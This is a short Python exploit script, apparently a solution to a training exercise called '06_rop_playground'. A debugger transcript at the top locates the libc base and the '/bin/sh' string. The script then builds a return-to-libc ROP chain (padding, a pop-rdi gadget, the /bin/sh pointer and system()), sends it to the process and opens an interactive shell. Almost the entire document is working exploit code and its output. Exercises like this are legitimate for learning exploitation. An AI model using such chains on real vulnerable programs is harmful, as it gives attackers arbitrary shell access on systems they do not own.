## info proc mappings --> for current base address
'''
wdb> ^C
wdb> b *main
Breakpoint 0 set at 0x40073b
wdb> r
Started '06_rop_playground'
Breakpoint 0: 0x40073b, main+0
wdb> info proc mappings
0x400000-0x401000 r-x 06_rop_playground
0x600000-0x601000 r-- 06_rop_playground
0x601000-0x602000 rw- 06_rop_playground
0x7f0000000000-0x7f0000026000 r-x ld-2.23.so
0x7f0000026000-0x7f0000027000 rw-
0x7f0000027000-0x7f0000028000 rw-
0x7f0000225000-0x7f0000226000 r-- ld-2.23.so
0x7f0000226000-0x7f0000228000 rw- ld-2.23.so
0x7f0000228000-0x7f00003e8000 r-x libc.so.6
0x7f00003e8000-0x7f00005e8000 --- libc.so.6
0x7f00005e8000-0x7f00005ec000 r-- libc.so.6
0x7f00005ec000-0x7f00005ee000 rw- libc.so.6
0x7f00005ee000-0x7f00005f2000 rw-
0x7ffffffde000-0x7ffffffff000 rw- [stack]

wdb> find 0x7f0000228000 0x7f00003e8000 /bin/sh
Found target at: 
0x7f00003b4d57
wdb> 
 

Now, if we want to calculate the address of any gadget in libc, we can use the following formula:

gadget_address = base_address + gadget_offset
'''

import interact
import struct


system_base = struct.pack('Q', 0x7f000026d390)
binsh_address = struct.pack('Q', 0x7f00003b4d57)
pop_rdi_ret = struct.pack('Q', 0x7f0000228000 + 0x0000000000021102)

p = interact.Process()


p.readuntil("Enter ROP chain:")
payload = 'A'*72 + pop_rdi_ret + binsh_address + system_base
p.sendline(payload)

p.interactive()